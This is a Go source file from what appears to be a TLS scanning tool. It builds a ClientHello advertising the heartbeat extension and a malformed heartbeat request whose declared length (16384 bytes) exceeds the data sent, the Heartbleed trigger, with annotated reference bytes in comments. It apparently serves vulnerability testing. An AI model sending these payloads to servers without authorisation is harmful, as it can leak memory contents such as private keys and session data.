package heartbleed

import (
	"encoding/hex"
	"fmt"

	"github.com/jsandas/tlstools/utils"
)

// tlsv1 = 01
// tlsv1.1 = 02
// tlsv1.2 = 03

func makePayload(tlsVers int) []byte {
	// Create equivalent of this string
	// heartbleed_payload="\x18\x03\x$TLSV\x00\x03\x01\x40\x00"
	var b []byte

	contentType := "18"
	tlsVersion := fmt.Sprintf("0%x", tlsVers)
	length := "0003" // 3 bytes
	hbType := "01"
	pLength := "4000" // 16384 bytes

	b, _ = hex.DecodeString(contentType + tlsVersion + length + hbType + pLength)

	// logger.Debugf("Heartbeat MSG: %X", b)

	return b
}

func makeClientHello(tlsVers int) []byte {
	var b []byte

	rand, _ := utils.GenRandBytes(32)

	contentType := "16"
	tlsVersion := fmt.Sprintf("0%x", tlsVers)
	length := "00dc"
	hsType := "01"
	hsLength := "0000d8"
	hsTLSVersion := fmt.Sprintf("0%x", tlsVers)
	random := hex.EncodeToString(rand)
	everythingElse := "000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101"

	b, _ = hex.DecodeString(contentType + tlsVersion + length + hsType + hsLength + hsTLSVersion + random + everythingElse)

	// logger.Debugf("ClientHello: %X", b)
	return b
}

// var clientHello, _ = hex.DecodeString("16030100dc010000d8030153435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101")
// client_hello="
// # TLS header (5 bytes)
// ,x16,               # Content type (x16 for handshake)
// x03, x$TLSV,        # TLS Version
// x00, xdc,           # Length
// # Handshake header
// x01,                # Type (x01 for ClientHello)
// x00, x00, xd8,      # Length
// x03, x$TLSV,        # TLS Version
// # Random (32 byte) Unix time etc, see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
// x53, x43, x5b, x90, x9d, x9b, x72, x0b,
// xbc, x0c, xbc, x2b, x92, xa8, x48, x97,
// xcf, xbd, x39, x04, xcc, x16, x0a, x85,
// x03, x90, x9f, x77, x04, x33, xd4, xde,
// x00,                # Session ID length
// x00, x66,           # Cipher suites length
// # Cipher suites (51 suites)
// xc0, x14, xc0, x0a, xc0, x22, xc0, x21,
// x00, x39, x00, x38, x00, x88, x00, x87,
// xc0, x0f, xc0, x05, x00, x35, x00, x84,
// xc0, x12, xc0, x08, xc0, x1c, xc0, x1b,
// x00, x16, x00, x13, xc0, x0d, xc0, x03,
// x00, x0a, xc0, x13, xc0, x09, xc0, x1f,
// xc0, x1e, x00, x33, x00, x32, x00, x9a,
// x00, x99, x00, x45, x00, x44, xc0, x0e,
// xc0, x04, x00, x2f, x00, x96, x00, x41,
// xc0, x11, xc0, x07, xc0, x0c, xc0, x02,
// x00, x05, x00, x04, x00, x15, x00, x12,
// x00, x09, x00, x14, x00, x11, x00, x08,
// x00, x06, x00, x03, x00, xff,
// x01,               # Compression methods length
// x00,               # Compression method (x00 for NULL)
// x00, x49,          # Extensions length
// # Extension: ec_point_formats
// x00, x0b, x00, x04, x03, x00, x01, x02,
// # Extension: elliptic_curves
// x00, x0a, x00, x34, x00, x32, x00, x0e,
// x00, x0d, x00, x19, x00, x0b, x00, x0c,
// x00, x18, x00, x09, x00, x0a, x00, x16,
// x00, x17, x00, x08, x00, x06, x00, x07,
// x00, x14, x00, x15, x00, x04, x00, x05,
// x00, x12, x00, x13, x00, x01, x00, x02,
// x00, x03, x00, x0f, x00, x10, x00, x11,
// # Extension: SessionTicket TLS
// x00, x23, x00, x00,
// # Extension: Heartbeat
// x00, x0f, x00, x01, x01
// "
